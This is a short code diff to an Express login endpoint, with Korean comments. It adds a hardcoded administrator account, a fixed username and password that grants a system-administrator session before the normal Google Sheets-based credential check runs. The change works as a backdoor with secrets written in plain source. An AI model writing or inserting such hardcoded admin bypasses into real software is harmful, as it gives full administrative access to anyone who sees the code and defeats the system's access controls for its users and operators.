@@ -246,6 +246,11 @@ app.post('/api/auth/login', async (req, res) => {
     return res.json({ success: true, user: userSession });
   };
 
+  // 하드코딩된 특정 관리자 계정
+  if (username === 'a250027' && password === '880805') {
+    return issueSession('관리자', '시스템관리자');
+  }
+
   // 1. 구글 시트의 '조직계정설정' 탭을 1순위로 조회하여 검증
   const client = await getAuthenticatedClient(req, res);
   if (client) {
